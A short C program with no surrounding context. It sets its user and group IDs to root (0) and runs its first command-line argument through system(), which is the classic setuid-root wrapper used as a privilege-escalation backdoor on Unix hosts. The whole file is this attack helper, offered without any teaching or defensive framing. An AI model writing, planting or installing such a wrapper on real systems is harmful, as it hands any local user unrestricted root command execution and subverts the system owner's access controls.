#include <stdio.h>

int main(int ac, char **av)
{
	setuid(0);
	setgid(0);
	system(av[1]);
	return 0;
}